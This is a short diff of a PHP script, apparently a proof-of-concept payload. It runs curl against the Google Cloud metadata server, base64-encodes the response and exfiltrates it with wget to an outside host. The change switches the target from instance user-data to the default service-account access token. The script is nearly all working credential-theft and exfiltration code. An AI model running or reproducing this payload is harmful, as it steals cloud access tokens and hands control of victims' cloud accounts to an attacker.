@@ -32,7 +32,7 @@ $ooo = base64_encode(exec("curl -i -v ".$url));
 system("wget http://php-exec.dns.pitr.be/?".$ooo);
 */
 
-$url2 = "http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data/";
-//$url2 = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token";
+//$url2 = "http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data/";
+$url2 = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token";
 $ooo2 = base64_encode(exec("curl -i -v -H 'Metadata-Flavor: Google' ".$url2));
 system("wget http://php-exec.dns.pitr.be/?".$ooo2);
